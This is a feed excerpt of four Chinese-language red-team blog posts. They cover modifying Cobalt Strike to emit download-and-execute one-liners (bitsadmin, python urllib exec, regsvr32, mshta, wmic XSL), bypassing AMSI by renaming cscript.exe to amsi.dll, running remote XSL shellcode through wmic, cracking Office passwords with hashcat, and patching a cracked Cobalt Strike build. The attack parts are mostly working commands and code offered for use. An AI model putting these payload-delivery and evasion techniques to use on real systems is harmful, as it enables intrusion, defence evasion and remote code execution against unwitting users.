    
  </entry>
  
  <entry>
    <title>Cobal Strike 自定义OneLiner</title>
    <link href="https://evi1cg.github.io/archives/Custom_Oneliner.html"/>
    <id>https://evi1cg.github.io/archives/Custom_Oneliner.html</id>
    <published>2018-06-26T23:51:00.000Z</published>
    <updated>2019-01-16T05:15:06.566Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00 起因"></a>0x00 起因</h2><p>在使用Cobal Strike的过程中，我们可以看到里面已经集成了几种 Script Web Delivery，如下图：</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/06/1971275379.png" alt="19484-drjxyu0m4wg.png"></p><p>而且在生成以后打开site,只需要点击<code>Copy URL</code>就可以把命令复制出来，再写aggressor脚本时也想要实现这个功能，发现copy以后只有url，并没有命令，所以为了一探究竟，还是把CS解压，grep了一把，定位到common.CommonUtils，发现了OneLiner方法：<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/93915533.png" alt="73927-nvotona7nxc.png"></p><p>所以要实现这个功能我们就需要对这个class进行修改，增加我们想要的命令。</p><h2 id="0x01-使用javassist修改class"><a href="#0x01-使用javassist修改class" class="headerlink" title="0x01 使用javassist修改class"></a>0x01 使用javassist修改class</h2><p>Javassist是一个能够操作字节码框架，通过它我们能很轻易的修改class代码。首先下载<a href="https://github.com/jboss-javassist/javassist/releases" target="_blank" rel="noopener">javassist</a> ，新建一个java工程，右键工程导入javassist包。</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/06/642698054.png" alt="15585-gsx22q9953w.png"></p><p>我们可能常用<code>mshta http://host/test.png</code> 的方式来请求payload，可以使用一下代码进行添加：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> changeclass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.CannotCompileException;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">change</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">updateMethod();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">updateMethod</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">ClassPool cPool = <span class="keyword">new</span> ClassPool(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//如果该文件引入了其它类，需要利用类似如下方式声明</span></span><br><span class="line"><span class="comment">//cPool.importPackage("java.util.List");</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置cobaltstrike.jar文件的位置</span></span><br><span class="line">cPool.insertClassPath(<span class="string">"/tmp/cobaltstrike.jar"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取该要修改的class对象</span></span><br><span class="line">CtClass cClass = cPool.get(<span class="string">"common.CommonUtils"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取到对应的方法</span></span><br><span class="line">CtMethod cMethod = cClass.getDeclaredMethod(<span class="string">"OneLiner"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//更改该方法的内部实现</span></span><br><span class="line"><span class="comment">//需要注意的是对于参数的引用要以$开始，不能直接输入参数名称</span></span><br><span class="line">cMethod.setBody(<span class="string">"&#123; if (\"bitsadmin\".equals($2)) &#123;"</span></span><br><span class="line">+ <span class="string">"String f = garbage(\"temp\");"</span></span><br><span class="line">+ <span class="string">"return \"cmd.exe /c bitsadmin /transfer \" + f + \" \" + $1 + \" %APPDATA%\\\\\" + f + \".exe&amp;%APPDATA%\\\\\" + f + \".exe&amp;del %APPDATA%\\\\\" + f + \".exe\";&#125;"</span></span><br><span class="line">+ <span class="string">"if (\"powershell\".equals($2)) &#123;"</span></span><br><span class="line">+ <span class="string">"return PowerShellOneLiner($1);&#125;"</span></span><br><span class="line">+ <span class="string">"if (\"python\".equals($2)) &#123;"</span></span><br><span class="line">+ <span class="string">"return \"python -c \\\"import urllib2; exec urllib2.urlopen('\" + $1 + \"').read();\\\"\";&#125;"</span></span><br><span class="line">+ <span class="string">"if (\"regsvr32\".equals($2)) &#123;"</span></span><br><span class="line">+ <span class="string">"return \"regsvr32 /s /n /u /i:\" + $1 + \" scrobj.dll\";&#125;"</span></span><br><span class="line">+ <span class="string">"if (\"mshta\".equals($2)) &#123;"</span></span><br><span class="line">+ <span class="string">"return \"mshta \" + $1;&#125;"</span></span><br><span class="line">+ <span class="string">"if (\"wmic\".equals($2)) &#123;"</span></span><br><span class="line">+ <span class="string">"  return \"wmic os get /format:\\\"\" + $1 + \"\\\"\";&#125;"</span></span><br><span class="line">+ <span class="string">"print_error(\"'\" + $2 + \"' for URL '\" + $1 + \"' does not have a one-liner\");"</span></span><br><span class="line">+ <span class="string">"throw new RuntimeException(\"'\" + $2 + \"' for URL '\" + $1 + \"' does not have a one-liner\");&#125;"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改以后输出目录</span></span><br><span class="line">cClass.writeFile(<span class="string">"/tmp/"</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">"=======修改方法完========="</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (NotFoundException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (CannotCompileException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>在这里要注意的是，方法 OneLiner(String url, String type)有两个参数，方法中的参数从 <code>$1</code> 开始，若该方法为非 static 方法，可以用 <code>$0</code> 来表示该方法实例自身，若该方法为 static 方法，则 <code>$0</code> 不可用。而且写的代码需要将<code>&quot;</code>, <code>\</code> 进行转义。</p></blockquote><p>运行此代码，可成功生成一个新的class:<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/954541639.png" alt="39332-5o637aqvh1.png"></p><p><img src="https://evi1cg.github.io/usr/uploads/2018/06/3152049107.png" alt="41077-02rq3jqomynr.png"></p><p>将此class替换CS中的class就好了。</p><p>使用的时候只需要在aggressor中site_host中指定即可，例如使用wmic<br><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site_host(<span class="built_in">%options</span>[<span class="string">"host"</span>], <span class="built_in">%options</span>[<span class="string">"port"</span>], <span class="built_in">%options</span>[<span class="string">"uri"</span>], <span class="built_in">$data</span>, <span class="string">"text/plain"</span>, <span class="string">"Scripted Web Delivery (wmic)"</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p><p>使用mshta<br><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site_host(<span class="built_in">%options</span>[<span class="string">"host"</span>], <span class="built_in">%options</span>[<span class="string">"port"</span>], <span class="built_in">%options</span>[<span class="string">"htauri"</span>], <span class="built_in">$htadata</span>, <span class="string">"application/hta"</span>, <span class="string">"Scripted Web Delivery (mshta)"</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p><p>效果如下：<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/aaaa.gif" alt="aaa"></p><p>已经编译好的class可以从这里下载：</p><p>GIT : <a href="https://github.com/ridter/CS_Chinese_support" target="_blank" rel="noopener">CS_Chinese_support</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-起因&quot;&gt;&lt;a href=&quot;#0x00-起因&quot; class=&quot;headerlink&quot; title=&quot;0x00 起因&quot;&gt;&lt;/a&gt;0x00 起因&lt;/h2&gt;&lt;p&gt;在使用Cobal Strike的过程中，我们可以看到里面已经集成了几种 Script Web Del
      
    
    </summary>
    
      <category term="技术分享" scheme="https://evi1cg.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="cobaltstrike" scheme="https://evi1cg.github.io/tags/cobaltstrike/"/>
    
  </entry>
  
  <entry>
    <title>DotNetToJScript 复活之路</title>
    <link href="https://evi1cg.github.io/archives/AMSI_bypass.html"/>
    <id>https://evi1cg.github.io/archives/AMSI_bypass.html</id>
    <published>2018-06-26T23:20:00.000Z</published>
    <updated>2019-01-25T00:25:31.549Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>去年James Forshaw开源了一个工具<a href="https://github.com/tyranid/DotNetToJScript" target="_blank" rel="noopener">DotNetToJScript</a>，能够利用JS、Vbs等脚本加载.Net程序。再此工具发布以后，很多很多的工具也在此基础上产生，比如<a href="https://github.com/Cn33liz/StarFighters" target="_blank" rel="noopener">StarFighters</a>、<a href="https://github.com/mdsecactivebreach/CACTUSTORCH" target="_blank" rel="noopener">CACTUSTORCH</a>、<a href="https://github.com/mdsecactivebreach/SharpShooter" target="_blank" rel="noopener">SharpShooter</a>等等，基于脚本的攻击也随之越来越多，所以在win10中，微软引入了AMSI，并将基于DotNetToJScript的脚本特征加入到检测之列。并将此工具标记为恶意软件。如果直接运行通过DotNetToJScript生成的脚本，便会直接拦截，如下图<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/1801330724.png" alt="1530067126795.png"><br>最近，学到了两种bypass的方式，所以进行一下分享。</p><h2 id="0x01-禁用AMSI"><a href="#0x01-禁用AMSI" class="headerlink" title="0x01 禁用AMSI"></a>0x01 禁用AMSI</h2><p>这里讲的禁用AMSI并不需要高权限，只需要一个简单的Trick,这个是从<a href="https://tyranidslair.blogspot.com/2018/06/disabling-amsi-in-jscript-with-one.html" target="_blank" rel="noopener">这篇文章</a>学来的，通过Process Monitor 进行查看，设置以下过滤器：<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/2667539399.png" alt="1530067444682.png"><br>运行通过DotNetToJScript生成的脚本，可以监控到以下调用过程：<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/870672142.png" alt="1530067501155.png"><br>这里我们可以看到，在加载AMSI之前，查询了以下注册表键值<code>HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable</code>,尝试修改此键值为0：<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/2027047255.png" alt="1530067589819.png"><br>再次运行脚本，可以看到shellcode成功执行了，如下图：<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/bypass.gif" alt="bypass"><br>虽然修改注册表可以实现禁用AMSI，但是需要高权限，那怎样才可以在普通权限下禁用AMSI，其实通过@tiraniddo的文章我们可以看到，其实可以通过DLL劫持来进行绕过。通过Process Monitor可以看到检测过程中调用了<code>C:\Windows\System32\amsi.dll</code>,如果我们把<code>cscript.exe</code> 重命名成amsi.dll会怎么样呢？<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy c:\windows\system32\cscript<span class="selector-class">.exe</span> amsi.dll</span><br><span class="line">amsi<span class="selector-class">.dll</span> evil.js</span><br></pre></td></tr></table></figure></p><p><img src="https://evi1cg.github.io/usr/uploads/2018/06/dllhijack.gif" alt="dllhijack"></p><p>可以看到成功shellcode 成功执行了，修改过滤器如下：<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/1527631724.png" alt="1530068708904.png"><br>我们来看一下调用过程<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/1301244891.png" alt="1530068764803.png"><br>可以看到，现在已经没有调用<code>C:\Windows\System32\amsi.dll</code>,这也就让我们成功执行了我们的shellcode。</p><h2 id="0x02-利用wmic"><a href="#0x02-利用wmic" class="headerlink" title="0x02 利用wmic"></a>0x02 利用wmic</h2><p>Casey Smith@subTee在博客分享的一个技巧，使用wmic能够从本地或从URL调用XSL（可扩展样式表语言）脚本。经过测试，通过此方式来调用DotNetToJScript的脚本也是可以成功执行的。subTee的文章<a href="https://subt0x11.blogspot.ca/2018/04/wmicexe-whitelisting-bypass-hacking.html?m=1" target="_blank" rel="noopener">在这</a>。利用命令如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Local File</span></span><br><span class="line">wmic process list /FORMAT:evil.xsl</span><br><span class="line"><span class="comment">#Remote File</span></span><br><span class="line">wmic os get /FORMAT:<span class="string">"https://example.com/evil.xsl"</span></span><br></pre></td></tr></table></figure></p><p>evil.xsl<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0'?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stylesheet</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span> <span class="attr">xmlns:ms</span>=<span class="string">"urn:schemas-microsoft-com:xslt"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:user</span>=<span class="string">"placeholder"</span></span></span><br><span class="line"><span class="tag"><span class="attr">version</span>=<span class="string">"1.0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">output</span> <span class="attr">method</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ms:script</span> <span class="attr">implements-prefix</span>=<span class="string">"user"</span> <span class="attr">language</span>=<span class="string">"JScript"</span>&gt;</span></span><br><span class="line">&lt;![CDATA[</span><br><span class="line">var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");</span><br><span class="line">]]&gt; <span class="tag">&lt;/<span class="name">ms:script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>修改好的脚本，可以看这里：<a href="https://raw.githubusercontent.com/Ridter/AMSI_bypass/master/shellcode.xsl" target="_blank" rel="noopener">戳我</a><br>使用一下命令则可执行shellcode<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic os get /FORMAT:<span class="string">"https://raw.githubusercontent.com/Ridter/AMSI_bypass/master/shellcode.xsl"</span></span><br></pre></td></tr></table></figure></p><p>但是使用wmic执行的时候会有一个问题，在powershell下执行会失败。如下图：<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/2600027528.png" alt="1530081940192.png"></p><p>那么怎么调用呢？<br>在读了mdsec的<a href="https://www.mdsec.co.uk/2018/06/freestyling-with-sharpshooter-v1-0/" target="_blank" rel="noopener">这篇文章</a>以后，我们发现，其实是可以通过COM来调用的。用javascript写可以这样：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xml = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLDOM"</span>);</span><br><span class="line">xml.async = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">var</span> xsl = xml;</span><br><span class="line">xsl.load(<span class="string">"http://host/a.xsl"</span>);</span><br><span class="line">xml.transformNode(xsl);</span><br><span class="line">self.close();</span><br></pre></td></tr></table></figure></p><p>GIT : <a href="https://github.com/ridter/AMSI_bypass" target="_blank" rel="noopener">AMSI_bypass</a></p><p>使用如下图：<br><img src="https://evi1cg.github.io/usr/uploads/2018/06/demo.gif" alt="demo"></p><h2 id="0x03参考"><a href="#0x03参考" class="headerlink" title="0x03参考"></a>0x03参考</h2><p><a href="https://tyranidslair.blogspot.com/2018/06/disabling-amsi-in-jscript-with-one.html" target="_blank" rel="noopener">https://tyranidslair.blogspot.com/2018/06/disabling-amsi-in-jscript-with-one.html</a><br><a href="https://subt0x11.blogspot.ca/2018/04/wmicexe-whitelisting-bypass-hacking.html?m=1" target="_blank" rel="noopener">https://subt0x11.blogspot.ca/2018/04/wmicexe-whitelisting-bypass-hacking.html?m=1</a><br><a href="https://www.mdsec.co.uk/2018/06/freestyling-with-sharpshooter-v1-0/" target="_blank" rel="noopener">https://www.mdsec.co.uk/2018/06/freestyling-with-sharpshooter-v1-0/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h2&gt;&lt;p&gt;去年James Forshaw开源了一个工具&lt;a href=&quot;https://github.com/
      
    
    </summary>
    
      <category term="奇技淫巧" scheme="https://evi1cg.github.io/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
    
    
      <category term="cobaltstrike" scheme="https://evi1cg.github.io/tags/cobaltstrike/"/>
    
  </entry>
  
  <entry>
    <title>使用hashcat破解加密office文件</title>
    <link href="https://evi1cg.github.io/archives/hashcat_crack_office.html"/>
    <id>https://evi1cg.github.io/archives/hashcat_crack_office.html</id>
    <published>2018-05-10T19:23:00.000Z</published>
    <updated>2019-01-15T05:43:36.770Z</updated>
    
    <content type="html"><![CDATA[<p>首先要下载 <a href="https://raw.githubusercontent.com/truongkma/ctf-tools/master/John/run/office2john.py" target="_blank" rel="noopener">office2john.py</a>，支持破解的加密为office自带的加密功能，即：<br><img src="https://evi1cg.github.io/usr/uploads/2018/05/914483746.png" alt="83000-eyr1re7d788.png"><br>使用office2john将office转换为hash：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python office2john.py 123.docx &gt; hash.txt</span><br></pre></td></tr></table></figure></p><p><img src="https://evi1cg.github.io/usr/uploads/2018/05/577752462.png" alt="48261-cl8sxps7xum.png"><br>使用以下命令进行切割，转换成hashcat支持的形式：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F <span class="string">":"</span> <span class="string">'&#123;print $2&#125;'</span> hash.txt &gt; hashhc.txt</span><br></pre></td></tr></table></figure></p><p><img src="https://evi1cg.github.io/usr/uploads/2018/05/640228905.png" alt="06114-1kst5rl8a9g.png"><br>使用hashcat进行破解：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 9500 hashhc.txt ~/wordlist/passwd.txt -o out.txt</span><br></pre></td></tr></table></figure></p><blockquote><p>这里我使用了office2010，所以选择9500，要根据对应版本来选择</p></blockquote><p>选择版本可以使用 hashcat –help 来查看<br><img src="https://evi1cg.github.io/usr/uploads/2018/05/2444185615.png" alt="17293-xqb7bq65lso.png"><br>破解成功如下：<br><img src="https://evi1cg.github.io/usr/uploads/2018/05/2101661963.png" alt="56296-fi7e6sribvo.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;首先要下载 &lt;a href=&quot;https://raw.githubusercontent.com/truongkma/ctf-tools/master/John/run/office2john.py&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;offic
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Cobalt strike3.8 中文支持(Update)</title>
    <link href="https://evi1cg.github.io/archives/CS3_8_chinese_support.html"/>
    <id>https://evi1cg.github.io/archives/CS3_8_chinese_support.html</id>
    <published>2018-03-31T20:00:00.000Z</published>
    <updated>2019-01-25T00:35:01.302Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>cobaltstrike3.10 已经出来很久了，其中最吸引人的可能就是他已经支持中文了，但是貌似很久以来都没在网上看到3.10的资源，所以就没办法，拿手上的3.8 改改将就用。</p><h2 id="0x01-反编译"><a href="#0x01-反编译" class="headerlink" title="0x01 反编译"></a>0x01 反编译</h2><p>首先我们要对cobaltstrike3.8进行反编译，这里可以参照之前破解的方法，<a href="https://evi1cg.github.io/archives/CobaltStrike_3_8_Cracked-html.html">戳我</a>,使用<a href="https://varaneckas.com/jad/" target="_blank" rel="noopener">jad</a>进行反编译。</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/709982344.png" alt="1522336230599.png"></p><h2 id="0x02-修改代码"><a href="#0x02-修改代码" class="headerlink" title="0x02 修改代码"></a>0x02 修改代码</h2><p>要怎么定位到要改哪里呢？<br>我们可以看一下CS的输出：</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/499620101.png" alt="1522336286954.png"></p><p>可以看到在输出之前有<strong><code>received output</code></strong>,所以我们就可以检索这个关键字，马上可以定位到<code>BeaconC2.class</code>文件，搜索“received output”一共有5个结果：</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/4264649045.png" alt="1522336540818.png"></p><p>查看代码如下：</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/373818852.png" alt="1522336597408.png"></p><p>可以看到，输出的结果是由CommonUtils类的bString方法返回的，定位到CommonUtils.class文件查看代码：</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/2911087243.png" alt="1522336678669.png"></p><p>可以看到传过来的数据使用 ISO8859-1 进行了编码。ISO8859-1属于<code>单字节</code>编码，最多能表示的字符范围是0-255，应用于英文系列。比如，字母a的编码为0x61=97。 很明显， ISO8859-1 编码表示的字符范围很窄，无法表示中文字符。这就是CS无法显示中文的原因。经过测试，使用 ISO8859-1 进行中间编码是不会导致数据丢失的。那么我们是不是可以修改代码把编码转过来来呢？当然可以 ！</p><p>但是由于自己比较菜，直接修改CommonUtils.java以后编译不过去（表示很难受，如果你会编译，还希望不吝赐教）。所以只能去修改BeaconC2.java。</p><p>经过多次测试，发现在CS上执行命令以后返回的结果编码为GBK，所以转码过程为<br>CommonUtils.java转码：<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GBK -&gt; ISO8859<span class="number">-1</span></span><br></pre></td></tr></table></figure></p><p>我们要修改的BeaconC2.<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISO8859<span class="number">-1</span> -&gt; GBK -&gt; UTF<span class="number">-8</span></span><br></pre></td></tr></table></figure></p><p>所以思路就很明朗了，我们只需要在传入rest之前把中文转换成UTF-8就可以了，代码也很简单，测试如下：</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/2963572890.png" alt="1522337535419.png"></p><p>所以关键代码为：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String tmp = CommonUtils.bString(CommonUtils.readAll(in));</span><br><span class="line">String tmp1 = <span class="keyword">new</span> String(tmp.getBytes(<span class="string">"ISO8859-1"</span>),<span class="string">"gbk"</span>);</span><br><span class="line">String rest = <span class="keyword">new</span> String(tmp1.getBytes(),<span class="string">"utf-8"</span>);</span><br></pre></td></tr></table></figure></p><p>源代码是这样：</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/1255700732.png" alt="1522337880400.png"></p><p>修改以后是这样：</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/529078158.png" alt="1522337852391.png"></p><p>所以找到所有的:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String rest = CommonUtils.bString(CommonUtils.readAll(in));</span><br></pre></td></tr></table></figure></p><p>替换即可。</p><h2 id="0x03-编译替换"><a href="#0x03-编译替换" class="headerlink" title="0x03 编译替换"></a>0x03 编译替换</h2><p>修改以后，需要把BeaconC2.java编译之后替换原来的BeaconC2.class。编译方法很简单，只需要把BeaconC2.java放到解压以后的CS目录，执行以下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -classpath . BeaconC2.java -Xlint:unchecked</span><br></pre></td></tr></table></figure></p><p>在这里，可能会碰到以下报错</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/396821423.png" alt="1522338365724.png"></p><p>这里可以改一下代码，将<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> c2profile.MalleableHook.MyHook;</span><br><span class="line"><span class="keyword">import</span> dns.DNSServer.Handler;</span><br></pre></td></tr></table></figure></p><p>改为：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> c2profile.MalleableHook;</span><br><span class="line"><span class="keyword">import</span> dns.DNSServer;</span><br></pre></td></tr></table></figure></p><p>在进行编译即可。之后将原来的BeaconC2.class替换，我们的CS就修改完成了。</p><h2 id="0x04-效果"><a href="#0x04-效果" class="headerlink" title="0x04 效果"></a>0x04 效果</h2><p>这里录了一个DEMO:</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/CS.gif" alt="CS.gif"></p><h2 id="0x05-纠错"><a href="#0x05-纠错" class="headerlink" title="0x05 纠错"></a>0x05 纠错</h2><p>经过小伙伴的反馈以及我自己的测试，发现这么粗暴的改是有问题的，如果把所有输出的编码都改了，会使得程序流程走不通，部分功能不能使用，所以还是要针对性的修改。也就是在<code>BeaconC2.class</code> 中修改想要的输出部分，首先，检索<code>received output</code>, 把其对应的<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String rest = CommonUtils.bString(CommonUtils.readAll(in));</span><br></pre></td></tr></table></figure></p><p>替换，之后经过测试 <code>type == 22</code> 是回显文件列表的，所以我们只需要修改这部分就好了。如下图：</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/3866425879.png" alt="1522599287195.png"></p><p>这样就不会造成程序其他功能上的错误了。关于上传，下载，执行等，都写在<code>TaskBeacon.class</code> 里面，可以针对性对其编码进行修改。这里就不详细说明了，有兴趣的可以自己去读一下代码，关于文件浏览，我们可以定位到<br><code>aggressor/windows/FileBrowser.class</code>,其双击事件代码如下：</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/3827844514.png" alt="1522637355520.png"></p><p>调用了<code>ls</code> 方法：</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/3527026008.png" alt="1522637409194.png"></p><p>ls 方法调用了 <code>beacons.task_ls</code>,快速定位到<code>server/Beacons.class</code>, 由于双击事件是取得返回转码以后的文字，所以要让功能正常使用，我们需要再将编码转回去，修改如下：</p><p><img src="https://evi1cg.github.io/usr/uploads/2018/04/1930021514.png" alt="1522637549907.png"></p><p>这样就可以正常使用文件浏览功能了，以上替换的class文件已经推到了github，欢迎小伙伴一起来修改bug~</p><p>GIT : <a href="https://github.com/ridter/CS_Chinese_support" target="_blank" rel="noopener">CS_Chinese_support</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h2&gt;&lt;p&gt;cobaltstrike3.10 已经出来很久了，其中最吸引人的可能就是他已经支持中文了，但是貌似很
      
    
    </summary>
    
      <category term="工具收集" scheme="https://evi1cg.github.io/categories/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"/>
    
    
